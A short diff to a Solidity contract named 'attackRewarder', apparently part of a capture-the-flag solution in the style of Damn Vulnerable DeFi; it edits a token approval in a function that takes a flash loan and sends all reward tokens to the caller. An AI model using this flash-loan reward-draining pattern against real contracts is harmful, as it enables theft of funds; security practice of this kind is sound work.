@@ -50,7 +50,7 @@ contract attackRewarder {
     }
 
     function callFlashLoan(uint256 _amount) external {
-        // DVToken.approve(address(FlashLoan), _amount);
+        DVToken.approve(address(target), _amount);
         FlashLoan.flashLoan(_amount);
         rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
     }
